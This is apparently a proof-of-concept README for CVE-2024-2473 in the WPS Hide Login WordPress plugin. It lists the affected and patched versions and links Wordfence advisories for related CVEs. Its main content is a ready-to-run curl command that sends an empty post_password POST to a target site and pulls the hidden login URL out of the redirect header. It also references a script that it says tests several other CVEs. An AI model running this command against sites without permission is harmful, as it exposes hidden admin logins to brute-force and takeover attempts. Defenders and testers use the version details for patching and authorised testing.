# WPS Hide Login <= 1.9.15.2 - Login Page disclosure (CVE-2024-2473)

Disclose login page hidden by [WPS-Hide-Login WordPress plugin](https://wordpress.org/plugins/wps-hide-login/).

Affected versions: 1.5.1 to 1.9.15.2

Patched version: 1.9.16

## Exploitation cURL command

```bash
curl -X POST -sk https://$target/wp-admin/?action=postpass -d 'post_password=' | grep -i location | cut -d ' ' -f 2- | cut -d '?' -f 1
```

## Exploitation Python script

This script include tests for other CVEs on [WPS-Hide-Login WordPress plugin](https://wordpress.org/plugins/wps-hide-login/).

```bash
./show-login.py -h
```

## References

- [CVE-2024-2473](https://www.wordfence.com/threat-intel/vulnerabilities/id/fd21c7d3-a5f1-4c3a-b6ab-0a979f070a62)
- [CVE-2021-24917](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wps-hide-login/wps-hide-login-190-hidden-login-page-location-disclosure)
- [CVE-2019-15826](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wps-hide-login/wps-hide-login-1522-login-page-disclosure-via-actionrp)
- [CVE-2019-15825](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wps-hide-login/wps-hide-login-1522-login-page-disclosure-via-referer-header)
- [CVE-2019-15824](https://wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wps-hide-login/wps-hide-login-1522-login-page-disclosure-via-actionconfirmaction)
- [CVE-2019-15823](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wps-hide-login/wps-hide-login-1522-login-page-disclosure-via-adminhash)
